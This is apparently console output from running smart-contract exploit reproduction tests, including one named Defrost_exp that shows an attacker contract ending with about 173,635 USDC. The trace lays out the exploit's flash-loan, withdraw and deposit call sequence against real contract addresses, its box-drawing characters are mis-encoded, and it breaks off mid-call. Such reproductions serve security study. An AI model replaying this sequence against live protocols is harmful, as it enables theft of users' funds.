Compiling 28 files with Solc 0.8.25
Solc 0.8.25 finished in 1.20s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
  --> src/test/2022-12/Defrost_exp.sol:21:5:
   |
21 |     IERC20 USDC = IERC20(0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E);
   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
    --> src/test/interface.sol:2629:1:
     |
2629 | interface USDC {
     | ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    в”њв”Ђ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    в”‚   в””в”Ђ в†ђ [Return] 
    в”њв”Ђ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    в”њв”Ђ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    в””в”Ђ в†ђ [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 262.00ms (808.12Вµs CPU time)

Ran 1 test for src/test/2022-12/Defrost_exp.sol:ContractTest
[PASS] testExploit() (gas: 630512)
Logs:
  [End] Attacker USDC balance after exploit: 173635.816661

Traces:
  [763912] ContractTest::testExploit()
    в”њв”Ђ [32861] 0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96::maxFlashLoan(0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E) [staticcall]
    в”‚   в”њв”Ђ [23027] 0x625E7708f30cA75bfd92586e17077590C60eb4cD::balanceOf(0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96) [staticcall]
    в”‚   в”‚   в”њв”Ђ [17975] 0xa5ba6E5EC19a1Bf23C857991c857dB62b2Aa187B::balanceOf(0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96) [delegatecall]
    в”‚   в”‚   в”‚   в”њв”Ђ [10278] 0x794a61358D6845594F94dc1DB02A252b5b4814aD::getReserveNormalizedIncome(0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [5226] 0xDF9e4ABdbd94107932265319479643D3B05809dc::getReserveNormalizedIncome(0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x00000000000000000000000000000000000000000346e981e0ac3276197b7494
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x00000000000000000000000000000000000000000346e981e0ac3276197b7494
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 194263946041 [1.942e11]
    в”‚   в”‚   в””в”Ђ в†ђ [Return] 194263946041 [1.942e11]
    в”‚   в””в”Ђ в†ђ [Return] 194263946041 [1.942e11]
    в”њв”Ђ [2825] 0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96::flashFee(0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E, 194263946041 [1.942e11]) [staticcall]
    в”‚   в””в”Ђ в†ђ [Return] 19426394 [1.942e7]
    в”њв”Ђ [666419] 0xf4003F4efBE8691B60249E6afbD307aBE7758adb::swap(0, 194283372435 [1.942e11], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x00)
    в”‚   в”њв”Ђ [43928] 0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 194283372435 [1.942e11])
    в”‚   в”‚   в”њв”Ђ [36728] 0xa3fa3D254bf6aF295b5B22cC6730b04144314890::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 194283372435 [1.942e11]) [delegatecall]
    в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0xf4003F4efBE8691B60249E6afbD307aBE7758adb, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 194283372435 [1.942e11])
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”њв”Ђ [579495] ContractTest::joeCall(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0, 194283372435 [1.942e11], 0x00)
    в”‚   в”‚   в”њв”Ђ [465338] 0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96::flashLoan(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E, 194263946041 [1.942e11], 0x00)
    в”‚   в”‚   в”‚   в”њв”Ђ [182939] 0x794a61358D6845594F94dc1DB02A252b5b4814aD::withdraw(0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E, 194263946041 [1.942e11], 0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96)
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [182378] 0xDF9e4ABdbd94107932265319479643D3B05809dc::withdraw(0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E, 194263946041 [1.942e11], 0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2402] 0xa97684ead0e402dC232d5A977953DF7ECBaB3CDb::getPriceOracle() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0xEBd36016B3eD09D4693Ed4251c67Bd858c3c7C9C
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [168757] 0xC603A9E957482298738EA65aA24e61b38859B48D::186dea44(0000000000000000000000000000000000000000000000000000000000000034000000000000000000000000000000000000000000000000000000000000003600000000000000000000000000000000000000000000000000000000000000373e93b99deab8fa8b6a363830758cb0270dc6ca5cd557b019a86bf7b25a3dd4e7000000000000000000000000b97ef9ef8734c71904d8002f8b6bc66dd9c48a6e0000000000000000000000000000000000000000000000000000002d3b089339000000000000000000000000ff152e21c5a511c478ed23d1b89bb9391be6de96000000000000000000000000000000000000000000000000000000000000000c000000000000000000000000ebd36016b3ed09d4693ed4251c67bd858c3c7c9c0000000000000000000000000000000000000000000000000000000000000000) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [7468] 0xFCCf3cAbbe80101232d343252614b6A3eE81C989::scaledTotalSupply() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2419] 0x81387c40EB75acB02757C1Ae55D5936E78c9dEd3::scaledTotalSupply() [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x000000000000000000000000000000000000000000000000000041da786a480b
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x000000000000000000000000000000000000000000000000000041da786a480b
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [11676] 0x307ffe186F84a3bc2613D1eA417A5737D69A7007::getSupplyData() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [6615] 0x52A1CeB68Ee6b7B5D13E0376A1E0E4423A8cE26e::getSupplyData() [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x000000000000000000000000000000000000000000000000000000100653c0a7000000000000000000000000000000000000000000000000000000100b095c580000000000000000000000000000000000000000002bbe2e26496e04a670b9dc00000000000000000000000000000000000000000000000000000000639b2002
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x000000000000000000000000000000000000000000000000000000100653c0a7000000000000000000000000000000000000000000000000000000100b095c580000000000000000000000000000000000000000002bbe2e26496e04a670b9dc00000000000000000000000000000000000000000000000000000000639b2002
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [1146] 0x625E7708f30cA75bfd92586e17077590C60eb4cD::scaledBalanceOf(0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [626] 0xa5ba6E5EC19a1Bf23C857991c857dB62b2Aa187B::scaledBalanceOf(0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000000000000000002c991c1e0a
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000000000000000002c991c1e0a
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [7499] 0xf4a0039F2d4a2EaD5216AbB6Ae4C4C3AA2dB9b82::calculateInterestRates((0, 0, 194263946041 [1.942e11], 68904639576 [6.89e10], 74078819311737 [7.407e13], 52881911184258890734811612 [5.288e25], 1000, 0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E, 0x625E7708f30cA75bfd92586e17077590C60eb4cD)) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [3226] 0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E::balanceOf(0x625E7708f30cA75bfd92586e17077590C60eb4cD) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2529] 0xa3fa3D254bf6aF295b5B22cC6730b04144314890::balanceOf(0x625E7708f30cA75bfd92586e17077590C60eb4cD) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 113483779637734 [1.134e14]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 113483779637734 [1.134e14]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x000000000000000000000000000000000000000000052ffc9dad08e9aaedad5b0000000000000000000000000000000000000000002b2d4b45143b7170bf606e0000000000000000000000000000000000000000000e8b0eb581a83ff5fb036d
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit ReserveDataUpdated(param0: 0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E, param1: 6271240264021828619316571 [6.271e24], param2: 52197705218632563323527278 [5.219e25], param3: 17581641749060506588218221 [1.758e25], param4: 1014182544046923627575866516 [1.014e27], param5: 1023095144527329322798772856 [1.023e27])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [81922] 0x625E7708f30cA75bfd92586e17077590C60eb4cD::burn(0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96, 0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96, 194263946041 [1.942e11], 1014182544046923627575866516 [1.014e27])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [81358] 0xa5ba6E5EC19a1Bf23C857991c857dB62b2Aa187B::burn(0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96, 0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96, 194263946041 [1.942e11], 1014182544046923627575866516 [1.014e27]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [27770] 0x929EC64c34a17401F460460D4B9390518E5B473e::handleAction(0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96, 185007454390983 [1.85e14], 191547317770 [1.915e11])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [20616] 0xaad324f7e4Dd50C6b105820f8a877eE2DCBFA789::handleAction(0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96, 185007454390983 [1.85e14], 191547317770 [1.915e11]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Accrued(param0: 0x625E7708f30cA75bfd92586e17077590C60eb4cD, param1: 0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7, param2: 0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96, param3: 360880007081595 [3.608e14], param4: 360880007081595 [3.608e14], param5: 249581836566397626 [2.495e17])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96, to: 0x0000000000000000000000000000000000000000, value: 194262400484 [1.942e11])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Burn(param0: 0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96, param1: 0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96, param2: 194262400484 [1.942e11], param3: 1545557 [1.545e6], param4: 1014182544046923627575866516 [1.014e27])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [33428] 0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E::transfer(0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96, 194263946041 [1.942e11])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [32728] 0xa3fa3D254bf6aF295b5B22cC6730b04144314890::transfer(0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96, 194263946041 [1.942e11]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0x625E7708f30cA75bfd92586e17077590C60eb4cD, to: 0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96, value: 194263946041 [1.942e11])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit ReserveUsedAsCollateralDisabled(param0: 0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E, param1: 0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96)
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Withdraw(param0: 0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E, param1: 0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96, param2: 0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96, param3: 194263946041 [1.942e11])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000000000000000002d3b089339
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 194263946041 [1.942e11]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 194263946041 [1.942e11]
    в”‚   в”‚   в”‚   в”њв”Ђ [4728] 0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 194263946041 [1.942e11])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [4028] 0xa3fa3D254bf6aF295b5B22cC6730b04144314890::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 194263946041 [1.942e11]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 194263946041 [1.942e11])
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”њв”Ђ [184811] ContractTest::onFlashLoan(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E, 194263946041 [1.942e11], 19426394 [1.942e7], 0x00)
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [25746] 0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E::approve(0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [25078] 0xa3fa3D254bf6aF295b5B22cC6730b04144314890::approve(0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [134878] 0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96::deposit(194263946041 [1.942e11], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [3089] 0x625E7708f30cA75bfd92586e17077590C60eb4cD::balanceOf(0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2537] 0xa5ba6E5EC19a1Bf23C857991c857dB62b2Aa187B::balanceOf(0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [1340] 0x794a61358D6845594F94dc1DB02A252b5b4814aD::getReserveNormalizedIncome(0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [788] 0xDF9e4ABdbd94107932265319479643D3B05809dc::getReserveNormalizedIncome(0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x00000000000000000000000000000000000000000346e981e0ac3276197b7494
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x00000000000000000000000000000000000000000346e981e0ac3276197b7494
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [25771] 0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96, 194263946041 [1.942e11])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [25097] 0xa3fa3D254bf6aF295b5B22cC6730b04144314890::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96, 194263946041 [1.942e11]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96, value: 194263946041 [1.942e11])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [1226] 0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E::balanceOf(0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [529] 0xa3fa3D254bf6aF295b5B22cC6730b04144314890::balanceOf(0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 194263946041 [1.942e11]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 194263946041 [1.942e11]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [56756] 0x794a61358D6845594F94dc1DB02A252b5b4814aD::supply(0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E, 194263946041 [1.942e11], 0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96, 0)
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [56192] 0xDF9e4ABdbd94107932265319479643D3B05809dc::supply(0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E, 194263946041 [1.942e11], 0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96, 0) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [54944] 0xC603A9E957482298738EA65aA24e61b38859B48D::1913f161(000000000000000000000000000000000000000000000000000000000000003400000000000000000000000000000000000000000000000000000000000000363e93b99deab8fa8b6a363830758cb0270dc6ca5cd557b019a86bf7b25a3dd4e7000000000000000000000000b97ef9ef8734c71904d8002f8b6bc66dd9c48a6e0000000000000000000000000000000000000000000000000000002d3b089339000000000000000000000000ff152e21c5a511c478ed23d1b89bb9391be6de960000000000000000000000000000000000000000000000000000000000000000) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [968] 0xFCCf3cAbbe80101232d343252614b6A3eE81C989::scaledTotalSupply() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [419] 0x81387c40EB75acB02757C1Ae55D5936E78c9dEd3::scaledTotalSupply() [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x000000000000000000000000000000000000000000000000000041da786a480b
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x000000000000000000000000000000000000000000000000000041da786a480b
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [3176] 0x307ffe186F84a3bc2613D1eA417A5737D69A7007::getSupplyData() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2615] 0x52A1CeB68Ee6b7B5D13E0376A1E0E4423A8cE26e::getSupplyData() [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x000000000000000000000000000000000000000000000000000000100653c0a7000000000000000000000000000000000000000000000000000000100b095c580000000000000000000000000000000000000000002bbe2e26496e04a670b9dc00000000000000000000000000000000000000000000000000000000639b2002
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x000000000000000000000000000000000000000000000000000000100653c0a7000000000000000000000000000000000000000000000000000000100b095c580000000000000000000000000000000000000000002bbe2e26496e04a670b9dc00000000000000000000000000000000000000000000000000000000639b2002
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [924] 0x625E7708f30cA75bfd92586e17077590C60eb4cD::scaledTotalSupply() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [375] 0xa5ba6E5EC19a1Bf23C857991c857dB62b2Aa187B::scaledTotalSupply() [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000000000000000a816ce7d6cbd
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000000000000000a816ce7d6cbd
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [5499] 0xf4a0039F2d4a2EaD5216AbB6Ae4C4C3AA2dB9b82::calculateInterestRates((0, 194263946041 [1.942e11], 0, 68904639576 [6.89e10], 74078819311737 [7.407e13], 52881911184258890734811612 [5.288e25], 1000, 0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E, 0x625E7708f30cA75bfd92586e17077590C60eb4cD)) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [1226] 0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E::balanceOf(0x625E7708f30cA75bfd92586e17077590C60eb4cD) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [529] 0xa3fa3D254bf6aF295b5B22cC6730b04144314890::balanceOf(0x625E7708f30cA75bfd92586e17077590C60eb4cD) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 113289515691693 [1.132e14]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 113289515691693 [1.132e14]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x000000000000000000000000000000000000000000052d3dff6f59d735f691fe0000000000000000000000000000000000000000002b2ccfebb246f9055e08370000000000000000000000000000000000000000000e8733ea72047c9af041ba
